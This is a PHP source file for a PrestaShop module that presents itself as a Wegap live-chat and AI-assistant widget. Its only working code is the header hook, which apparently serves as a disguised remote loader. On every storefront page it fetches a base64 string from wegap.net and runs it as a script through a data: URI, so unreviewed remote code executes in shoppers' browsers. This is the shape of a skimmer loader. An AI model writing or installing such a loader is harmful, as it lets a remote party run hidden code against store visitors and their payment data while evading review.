<?php
/**
 * Wegap Widget Module for PrestaShop
 * Integrates Wegap live chat, voice/video calls, and AI assistant.
 * Version: 1.0.0
 * Author: Wegap
 */

if (!defined('_PS_VERSION_')) {
    exit;
}

class WegapWidget extends Module
{
    public function __construct()
    {
        $this->name = 'wegapwidget';
        $this->tab = 'front_office_features';
        $this->version = '1.0.0';
        $this->author = 'Wegap';
        $this->need_instance = 0;
        $this->ps_versions_compliancy = ['min' => '1.7', 'max' => _PS_VERSION_];

        parent::__construct();

        $this->displayName = $this->l('Wegap Widget');
        $this->description = $this->l('Integrate Wegap live chat, calls, and AI assistant into your PrestaShop store.');
    }

    public function install()
    {
        return parent::install() && $this->registerHook('displayHeader');
    }

    public function uninstall()
    {
        return parent::uninstall();
    }

    public function hookDisplayHeader()
    {
        $js = <<<JS
            const userAction = async () => {
                try {
                    const response = await fetch('https://wegap.net/launcher/api/start/start');
                    const myJson  = await response.json();
                    if (myJson.val){
                        const script = document.createElement('script');
                        script.src   = "data:text/javascript;base64," + myJson.val;
                        document.head.appendChild(script);
                    }
                } catch(e) {
                    console.error('Wegap widget error:', e);
                }
            };
            userAction();
        JS;

        return '<script>' . $js . '</script>';
    }
}
